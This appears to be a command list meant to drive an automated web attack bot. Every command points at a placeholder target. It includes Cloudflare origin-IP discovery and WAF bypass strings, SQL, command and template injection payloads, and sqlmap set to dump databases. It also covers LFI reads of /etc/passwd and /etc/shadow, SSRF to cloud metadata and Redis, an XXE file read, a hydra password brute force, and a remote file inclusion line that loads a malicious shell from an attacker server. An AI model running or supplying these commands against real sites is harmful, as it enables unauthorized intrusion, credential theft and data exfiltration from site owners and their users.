# General Placeholder:
# Replace [TARGET_URL] with the full URL (e.g., http://example.com or https://example.com)
# Replace [TARGET_DOMAIN] with just the domain (e.g., example.com)
# Replace [ATTACKER_SERVER_URL] with your controlled server's URL for RFI testing

# --- Cloudflare Bypass - Real IP Discovery ---
# These commands aim to find the real IP address of the target server behind Cloudflare.
# Note: Finding the real IP dynamically to use in subsequent commands requires
# significant modifications to the bot's core Python script.
# Currently, you would need to run these commands, find the IP manually,
# and then update [TARGET_URL] and [TARGET_DOMAIN] in the commands.txt file for later tests.

# 1. Passive: Certificate Transparency Log Search (crt.sh) for IPs
# This command fetches SSL certificates for the domain and extracts potential IPv4 addresses.
# It might include Cloudflare IPs and potentially origin IPs. Manual analysis of output is needed.
# Requires: curl, grep, sort
curl -s "https://crt.sh/?q=%25.{TARGET_DOMAIN}" | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | sort -u

# 2. Passive: Subdomain Enumeration & filtering for non-Cloudflare IPs (using dig)
# This command checks common subdomains and tries to filter out known Cloudflare IP ranges.
# Note: Cloudflare's IP ranges are extensive and can change, so this filter is not foolproof.
# Requires: dig, grep
for sub in www mail admin dev api blog staging test; do dig +short "$sub.{TARGET_DOMAIN}" | grep -vE "^104\.1[6-9]\.|^172\.6[4-9]\.|^188\.114\.9[6-9]\.|^190\.93\.2[4-9]\.|^162\.158\.|^108\.162\.|^198\.41\.|^104\.2[0-9]\.|^162\.159\.|^198\.41\."; done

# 3. Passive: Subdomain Enumeration with Sublist3r (more comprehensive)
# Requires Sublist3r to be installed (often via pip or apt).
# Example installation (if not already installed): pip install sublist3r
sublist3r -d [TARGET_DOMAIN] -o subdomains_sublist3r.txt

# 4. Passive: Subdomain Enumeration with Assetfinder (another good tool)
# Requires Assetfinder to be installed (often via Go, or download binary).
# Example installation: go install github.com/tomnomnom/assetfinder@latest
assetfinder [TARGET_DOMAIN] > assetfinder_subs.txt

# 5. Passive: Check for common misconfigured hosts/subdomains for potential direct access
# Attempts to check HTTP status codes for common subdomains that might not be behind Cloudflare.
# Requires: curl, grep
for path in cpanel webmail mail blog forum test dev staging admin; do curl -s -I "https://$path.{TARGET_DOMAIN}" | grep "HTTP"; done

# 6. Passive: Check for AAAA (IPv6) records that might bypass Cloudflare
# Sometimes, the origin server has an IPv6 address not proxied by Cloudflare.
# Requires: dig
dig +short AAAA {TARGET_DOMAIN}

# --- Original Test Commands (with user's additions and modifications) ---

# Directory & File Enumeration
for path in admin api/private restricted secret user/profile .git/config backup.tar.gz config.php.bak .env .htaccess phpinfo.php server-status backup logs debug config.bak config.php.old config.save; do curl -s -I "[TARGET_URL]/$path" | grep "HTTP"; done
curl -H "Authorization: Bearer fake_token" [TARGET_URL]/secret
curl -b "session=invalid" [TARGET_URL]/user/profile
curl -X POST [TARGET_URL]/restricted
curl -s [TARGET_URL]/admin > /dev/null && echo "Admin page exists"
dirb [TARGET_URL] /usr/share/wordlists/dirb/big.txt -o dirb_results.txt # Requires Dirb to be installed.
gobuster dir -u [TARGET_URL] -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,bak,old -o gobuster_results.txt # Requires Gobuster to be installed.

# Port & Service Enumeration
nmap -p 80,443 --script http-methods,http-auth,http-security-headers,http-default-accounts,http-config-backup [TARGET_DOMAIN] -oN nmap_security_scan.txt
netstat -tuln | grep -v "127.0.0.1" # (Local system check)
ss -tuln | grep -v "127.0.0.1" # (Local system check)

# SSL/TLS & Cryptography Testing
testssl.sh [TARGET_DOMAIN]:443 > ssl_test_results.txt # Requires testssl.sh to be installed.
sslyze [TARGET_DOMAIN]:443 >> ssl_test_results.txt # Removed --regular as it caused an 'unrecognized arguments' error. Requires SSLyze to be installed.
nmap --script ssl-enum-ciphers,ssl-cert,ssl-heartbleed,ssl-date -p 443 [TARGET_DOMAIN] -oN ssl_nmap_results.txt
grep -r "SSLProtocol" /etc/apache2 /etc/nginx # (Local system check)
grep -r "SSLCipherSuite" /etc/apache2 /etc/nginx # (Local system check)

# Injection Attacks (SQLi, XSS, Command Injection, LFI, SSRF)
for payload in "admin'--" "<script>alert(1)</script>" ";whoami" "1%20OR%201=1" "admin%27%20%23" "\";drop table users--"; do curl -s "[TARGET_URL]/search?query=$payload" | grep -i "error\|alert\|whoami"; done
sqlmap -u "[TARGET_URL]/search?id=1" --batch --dbs --tables --dump --risk=3 --level=5 # Removed '-o' as it's not a standard output flag without a directory. Requires sqlmap to be installed.
curl "[TARGET_URL]/file?path=../../../../etc/passwd"
curl "[TARGET_URL]/api?data=`whoami`"
nmap --script http-sql-injection -p 80 [TARGET_DOMAIN] # Note: http-xss and http-phpself-xss scripts might not be standard Nmap scripts or may require specific Nmap versions/updates. Consider using dedicated XSS scanning tools if Nmap scripts fail.

# Internal Server Security & PHP Configuration
grep -r -E "hardcoded_password|secret_key|api_key|mysql_connect|exec\(|system\(|password=" /var/www/html # (Local system check)
find /var/www -type f -name "*.php" -exec grep "eval(" {} \; -print # (Local system check)
find /var/www -type f -name "*.bak" -o -name "*.log" -o -name "*.sql" # (Local system check)
grep -r -E "disable_functions|allow_url_fopen|allow_url_include" /etc/php* # (Local system check)
for url in "http://localhost:8080" "http://127.0.0.1" "file:///etc/passwd" "http://169.254.169.254" "gopher://localhost:6379"; do curl -s "[TARGET_URL]/api?url=$url" | grep -i "internal\|error"; done

# Authentication & Session Management Testing
hydra -l admin -P /usr/share/wordlists/rockyou.txt [TARGET_DOMAIN] http-post-form "/login:user=^USER^&pass=^PASS^:Invalid" -t 4 # Requires Hydra to be installed.
curl -c cookies.txt -d "username=admin&password=test" [TARGET_URL]/login
curl -b cookies.txt [TARGET_URL]/profile
curl -H "Cookie: session=expired" [TARGET_URL]

# Log Analysis
tail -f /var/log/auth.log | grep "failed" # (Local system check - this is a follow-up command that might need special handling in a script)
cat /var/log/nginx/access.log /var/log/apache2/error.log | grep -i "error\|sql\|xss" # (Local system check)
journalctl -u sshd --since "1 hour ago" # (Local system check)

# --- New Suggested Commands (from your latest input) ---

# Web Application Firewall (WAF) & Bypass Testing
wafw00f [TARGET_DOMAIN] # Requires Wafw00f to be installed.
curl -s "[TARGET_URL]/search?query=id=1%23"
curl -s "[TARGET_URL]/search?query=id=1%2F%2A%2A%2FOR%2F%2A%2A%2F1=1"

# XML External Entity (XXE) Injection Testing
curl -X POST -H "Content-Type: application/xml" -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' [TARGET_URL]/api/xml_endpoint

# Server-Side Template Injection (SSTI) Testing
# These Payloads may vary depending on the Template Engine
curl -X POST -d "name={{7*7}}" [TARGET_URL]/template_page
curl -X POST -d "name={{config.__class__.mro__}}" [TARGET_URL]/template_page

# Insecure Direct Object Reference (IDOR) Testing
# IDs must be changed based on the target URL or API structure
curl "[TARGET_URL]/api/v1/users/123"
curl "[TARGET_URL]/api/v1/users/1" # Example ID change
curl -X POST -d "user_id=123&action=view_profile" [TARGET_URL]/dashboard

# Clickjacking Testing (Header check only)
curl -s -I "[TARGET_URL]" | grep -i "X-Frame-Options"

# Email Spoofing / DMARC / SPF / DKIM Testing (DNS Records check)
dig txt [TARGET_DOMAIN] | grep -i "spf"
dig txt _dmarc.[TARGET_DOMAIN] | grep -i "dmarc"

# Git Repository Configuration Check
curl "[TARGET_URL]/.git/config"
curl "[TARGET_URL]/.git/HEAD"

# More Payloads for LFI
curl "[TARGET_URL]/page.php?file=../../../../etc/shadow"
curl "[TARGET_URL]/page.php?file=../../../../proc/self/cmdline"

# Payload for RFI (for testing on a controlled environment with an attacker server only)
curl "[TARGET_URL]/page.php?file=[ATTACKER_SERVER_URL]/malicious_shell.txt"

# Cross-Site Request Forgery (CSRF) Testing
curl -s "[TARGET_URL]/login" | grep -i "csrf_token"